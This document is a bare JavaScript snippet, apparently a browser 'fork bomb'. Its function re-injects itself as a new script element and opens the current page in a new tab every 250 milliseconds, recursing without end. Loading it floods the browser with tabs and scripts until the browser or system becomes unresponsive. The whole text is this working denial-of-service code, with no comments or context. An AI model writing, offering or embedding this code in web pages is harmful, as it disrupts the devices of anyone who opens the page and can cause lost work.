function fork() {
  const script = document.createElement("script");
  script.innerHTML = fork + "\n" + "fork();";
  document.head.appendChild(script);
  setTimeout(function() {
    const link = document.createElement('a');
    link.href = window.location.href;
    link.target = '_blank';
    link.rel = 'noopener noreferrer';
    link.click();
    fork();
  }, 250);
}

fork();
